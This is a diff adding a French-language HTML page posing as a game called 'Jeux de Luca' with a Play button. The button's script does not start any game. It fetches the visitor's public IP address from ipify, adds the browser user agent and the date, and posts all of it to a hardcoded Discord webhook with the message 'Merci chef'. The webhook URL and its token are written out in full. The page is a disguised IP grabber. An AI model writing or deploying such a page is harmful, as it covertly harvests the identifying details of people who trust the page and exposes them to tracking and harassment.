@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Luca</title>
+</head>
+<body>
+
+    <h2>Jeux de Luca</h2>
+    <p>Jouer.</p>
+
+    <button onclick="sendInfo()">Play</button>
+
+    <script>
+        function sendInfo() {
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => {
+
+                    const ip = data.ip;
+                    const ua = navigator.userAgent;
+                    const date = new Date().toLocaleString();
+
+                    const message = 
+                        `Merci chef :\n` +
+                        `IP : ${ip}\n` +
+                        `User-Agent : ${ua}\n` +
+                        `Date : ${date}`;
+
+                    fetch("https://discord.com/api/webhooks/1444723331512275004/vnvo2zeHThnPt1v1u1oGpq1o05pfX6G_FQZuJbYgbBOlEKWD9bIEN6jLTRwvNT7lyDm6", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ content: message })
+                    })
+                    .then(() => alert("Informations envoyées. Merci !"))
+                    .catch(() => alert("Erreur lors de l'envoi."));
+                });
+        }
+    </script>
+</body>
+</html>
